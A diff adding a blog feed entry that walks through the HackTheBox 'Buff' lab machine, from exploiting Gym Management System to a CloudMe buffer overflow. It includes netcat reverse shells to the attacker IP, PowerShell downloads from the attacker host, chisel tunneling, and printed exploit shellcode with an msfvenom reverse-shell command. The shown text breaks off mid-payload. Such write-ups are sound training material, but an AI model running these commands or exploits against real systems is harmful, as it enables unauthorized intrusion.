@@ -641,6 +641,288 @@
     </item>
     
     <item>
+      <title>HackTheBox - Buff</title>
+      <link>https://fahmifj.github.io/hackthebox/buff/</link>
+      <pubDate>Sat, 01 May 2021 16:30:16 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/buff/</guid>
+      <description>Tunneling with Chisel to deliver a buffer overflow exploit</description>
+      <content:encoded><![CDATA[<p>Buff is a Windows machine with easy difficulty  from HackTheBox that features an open source web application called &ldquo;Gym Management System&rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Gym Management System 1.0 Exploitation</li>
+<li>Tunneling</li>
+<li>CloudMe 1.12 Exploitation</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>searchsploit/Exploit-DB - Preinstalled in Kali Linux</li>
+<li><a href="https://github.com/jpillora/chisel/releases">chisel</a></li>
+<li>msfvenom - Preinstalled in Kali Linux</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>An initial scan with <code>nmap</code> only discovers one port open on 8080 running an Apache web server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «~» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache httpd 2.4.43 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: mrb3n’s Bro Hut
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
+<p>Visiting port 8080 displays a website for a Gym, on the title it is called &ldquo;mrb3n&rsquo;s Bro Hut&rdquo;.</p>
+<img src="imgs/image-20210502140814680.png" alt="image-20210502140814680" style="zoom: 67%;" />
+<p>Clicking on the contact page discovers the name of the software behind this web application.</p>
+<img src="imgs/image-20210502140846741.png" alt="image-20210502140846741" style="zoom:67%;" />
+<h4 id="searchsploit">Searchsploit</h4>
+<p>I can feed the software name to <code>searchsploit</code>. It pops several exploits, and one that stands out is a remote code execution.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «machines» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ searchsploit Gym Management System 1.0
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                                 <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Gym Management System 1.0 - <span class="s1">&#39;id&#39;</span> SQL Injection                                 <span class="p">|</span> php/webapps/48936.txt
+</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Authentication Bypass                              <span class="p">|</span> php/webapps/48940.txt
+</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Stored Cross Site Scripting                        <span class="p">|</span> php/webapps/48941.txt
+</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Unauthenticated Remote Code Execution              <span class="p">|</span> php/webapps/48506.py
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
+</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-shaun">Shell as shaun</h3>
+<p>I will grab the unauth RCE with <code>searchsploit -m</code>, it allows me to mirror/make a copy of the &ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution&rdquo; exploit to the current working directory</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ searchsploit -m <span class="m">48506</span>
+</span></span><span class="line"><span class="cl">  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/48506
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
+</span></span><span class="line"><span class="cl">File Type: Python script, ASCII text executable, with CRLF line terminators
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copied to: /root/htb/machines/buff/exploit/48506.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ ls -l
+</span></span><span class="line"><span class="cl">total <span class="m">8</span>
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">5164</span> May  <span class="m">2</span> 04:29 48506.py
+</span></span></code></pre></div><p>I will rename <code>48506.py</code> to <code>exploit.py</code>, and run it afterwards.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ python exploit.py http://10.10.10.198:8080/
+</span></span></code></pre></div><img src="imgs/image-20210502153153898.png" alt="image-20210502153153898" style="zoom:67%;" />
+<p>With current webshell, I can&rsquo;t change my directory but I can still grab the user flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\s</span>haun<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
+</span></span></code></pre></div><h4 id="upgrade-to-interactive-shell">Upgrade to Interactive Shell</h4>
+<p>To make the shell a bit more comfy, I uploaded a <code>netcat</code> using <code>powershell</code> to Buff, and then I will create another reverse shell session.</p>
+<p>First, I will host a 64 bit netcat, <code>nc64.exe</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ python -m http.server <span class="m">80</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">10.10.10.198 - - <span class="o">[</span>14/Aug/2020 10:11:02<span class="o">]</span> <span class="s2">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span class="m">200</span>
+</span></span></code></pre></div><p>On Buff, I will grab the hosted <code>nc64.exe</code> using PowerShell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="p">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe&#34;</span>
+</span></span></code></pre></div><p>While having my netcat listening, I will send a reverse shell from Buff by leveraging the uploaded netcat.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;.<span class="se">\n</span>c.exe -e cmd.exe 10.10.14.18 <span class="m">9001</span>
+</span></span></code></pre></div><p>On my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.18<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.198<span class="o">]</span> <span class="m">64518</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17134.1550<span class="o">]</span>  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-administrator">Shell as Administrator</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>After enumerating the Users folder, I noticed a slightly different output when typing the <code>dir</code> command in <code>shaun</code> home directory.</p>
+<p><div class="img-container"><img src="imgs/image-20210502155544622.png" alt="image-20210502155544622"  /></div>
+</p>
+<p>In the Download folder, there is an executable file called <code>CloudMe_1112.exe</code>, where 1112 is likely a version number.</p>
+<p>Checking on currently running services with <code>netstat</code> discovers an unknown service bound on localhost port 8888.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; netstat -aonp tcp
+</span></span><span class="line"><span class="cl">Active Connections
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Proto  Local Address          Foreign Address        State           PID
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
+</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:8888            0.0.0.0:0              LISTENING       <span class="m">7352</span>
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...  
+</span></span></code></pre></div><p>I can search the program name using the <code>tasklist</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; tasklist /FI <span class="s2">&#34;PID eq 7352&#34;</span> /v /FO list
+</span></span></code></pre></div><img src="imgs/image-20210502160832477.png" alt="image-20210502160832477" style="zoom:67%;" />
+<p>So PID 7352 on port 8888 is running <code>CloudMe.exe</code>, and because the user name field is showing as <strong>N/A</strong>, one possible thing is that I don’t have enough privilege to dig for more information about that process (it might be running with a higher privilege, either administrator or a local system).</p>
+<h4 id="searchsploit-1">Searchsploit</h4>
+<p>A quick search about &ldquo;CloudMe&rdquo; on <code>searchsploit</code> pops some buffer overflow exploits. Four of them are exact match. I will grab the PoC version.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ searchsploit CloudMe
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                                 <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>PoC<span class="o">)</span>                                         <span class="p">|</span> windows/remote/48389.py
+</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>SEH_DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48499.txt
+</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow ROP <span class="o">(</span>DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48840.py
+</span></span><span class="line"><span class="cl">Cloudme 1.9 - Buffer Overflow <span class="o">(</span>DEP<span class="o">)</span> <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> windows_x86-64/remote/45197.rb
+</span></span><span class="line"><span class="cl">CloudMe Sync 1.10.9 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)(</span>DEP Bypass<span class="o">)</span>                        <span class="p">|</span> windows_x86-64/local/45159.py
+</span></span><span class="line"><span class="cl">CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow <span class="o">(</span>Metasploit<span class="o">)</span>                 <span class="p">|</span> windows/remote/44175.rb
+</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.0 - Local Buffer Overflow                                    <span class="p">|</span> windows/local/44470.py
+</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                <span class="p">|</span> windows/remote/46218.py
+</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span class="o">(</span>DEP Bypass<span class="o">)</span>                       <span class="p">|</span> windows_x86-64/remote/46250.py
+</span></span><span class="line"><span class="cl">CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                        <span class="p">|</span> windows/remote/44027.py
+</span></span><span class="line"><span class="cl">CloudMe Sync &lt; 1.11.0 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)</span> <span class="o">(</span>DEP Bypass<span class="o">)</span>                     <span class="p">|</span> windows_x86-64/remote/44784.py
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
+</span></span></code></pre></div><h4 id="tunneling">Tunneling</h4>
+<p>The CloudMe program is currently listening on localhost (bound), so to interact with it, I&rsquo;ll have to setup a tunnel/port forwarding. For this, I&rsquo;ll use <code>chisel</code> (<a href="https://github.com/jpillora/chisel/releases)">https://github.com/jpillora/chisel/releases)</a>.</p>
+<blockquote>
+<p>Example usage of chisel is explained better in this blog :</p>
+<ul>
+<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel</a></li>
+</ul>
+</blockquote>
+<p>First, I&rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\s</span>haun<span class="se">\D</span>ownload&gt; powershell.exe <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe&#34;</span>
+</span></span></code></pre></div><p>Second, I&rsquo;ll setup a chisel server on my Kali.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ chisel server -p <span class="m">9002</span>
+</span></span><span class="line"><span class="cl">2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2
+</span></span><span class="line"><span class="cl">2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002...
+</span></span></code></pre></div><p>On Buff, I&rsquo;ll connect as client to my chisel server on Kali.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\s</span>haun<span class="se">\D</span>ownload&gt; .<span class="se">\c</span>s.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888
+</span></span></code></pre></div><img src="imgs/image-20210502162654346.png" alt="image-20210502162654346" style="zoom:67%;" />
+<p>This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff&rsquo;s localhost on port 8888.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Kali localhost:8888 &lt;-&gt; (Kali 10.10.14.18:9002 &lt;-&gt; Buff:10.10.10.198:XXX) &lt;-&gt; Buff localhost:8888
+</span></span></code></pre></div><h4 id="exploitation-cloudme-1112">Exploitation CloudMe 1.11.2</h4>
+<p>I&rsquo;ll use this exploit PoC (I&rsquo;ve renamed it to <code>bofexploit.py</code>) but I&rsquo;ll have to modify the payload with my own.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Date: 2020-04-27</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: Andy Bowden</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Vendor Homepage: https://www.cloudme.com/en</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Version: CloudMe 1.11.2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: Windows 10 x86</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Instructions:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Start the CloudMe service and run the script.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">padding1</span>   <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
+</span></span><span class="line"><span class="cl"><span class="n">EIP</span>        <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
+</span></span><span class="line"><span class="cl"><span class="n">NOPS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">overrun</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
+</span></span></code></pre></div><p>To generate a new payload/shell code, I&rsquo;ll be using <code>msfvenom</code>. But, instead of running <code>calc.exe</code>, I&rsquo;ll change it to execute the netcat I&rsquo;ve uploaded before (during upgrading shell).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ msfvenom -p windows/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 9005&#39;</span> -b <span class="s1">&#39;\x00\x0A\x0D&#39;</span> -f python -v payload
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3&#34;</span>
